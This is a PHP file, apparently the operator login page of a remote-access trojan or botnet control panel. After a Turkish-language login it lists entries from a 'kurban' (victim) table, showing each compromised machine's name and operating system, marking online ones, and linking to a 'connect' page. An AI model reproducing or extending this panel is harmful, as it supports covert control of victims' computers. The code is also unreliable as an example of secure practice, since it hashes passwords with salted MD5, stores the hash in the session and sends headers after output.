<?php

include("vt.php");

  ob_start();
  session_start();
  
  $username=htmlspecialchars(strip_tags(addslashes(stripslashes($_POST["ad"]))));
  $password=htmlspecialchars(strip_tags(addslashes(stripslashes($_POST["sifre"]))));
  
	  if($username!="" and $password!=""){
		  
		  $password=md5('56.o*' . $password . '?2,3!');
			$sorgu = $db->prepare("select * from kullanici where username = :username and password =:password");
			$sorgu->bindparam(":username",$username,PDO::PARAM_STR);
			$sorgu->bindparam(":password",$password,PDO::PARAM_STR);
			$sorgu->execute();
			$sayi = $sorgu->rowcount();
			if($sayi==0){
				
				echo "Kullancı Adı veya Şifre Yanlış.<br>";
  echo "Giriş sayfasına yönlendiriliyorsunuz.";
  header("Refresh: 10; url=index.php");
  
			}else{
	  
  $_SESSION["login"] = "true";
  $_SESSION["username"] = $username;
  $_SESSION["password"] = $password;
  
  $_SESSION["id"] = $id;
  $_SESSION["ip"] = $_SERVER["REMOTE_ADDR"];
include("vt.php");  $db = $db->query("SELECT * FROM kurban order by id asc");       $oku = $db->fetchAll(PDO::FETCH_ASSOC);   foreach ($oku as $row) {  extract($row);  if ($acik==1){  echo "<form action='' method='POST'>		<br><font face='tahoma' size='4' color='green'>".$bilgisayaradi."</font><br><font face='tahoma' size='4' color='green'>".$isletim."</font><br> <a href='kurbanguncelle.php?id=$id'>Bağlan</a> <br><br></form>";  $acik=0;  include("vt.php");  $guncelle = $db->prepare("UPDATE kurban SET acik=:acik WHERE id=:id");								$guncelle->execute([':acik' => $acik,':id'=>$id]);    }else{	  echo "<form action='' method='POST'>		<br><font face='tahoma' size='4' color='red'>".$bilgisayaradi."</font><br>	<br></form>";    }    }
  
  header("Location:icerik.php");
  
  }
}else{
	
			echo 'Lütfen Tüm Alanları Doldur';
		}
  ?>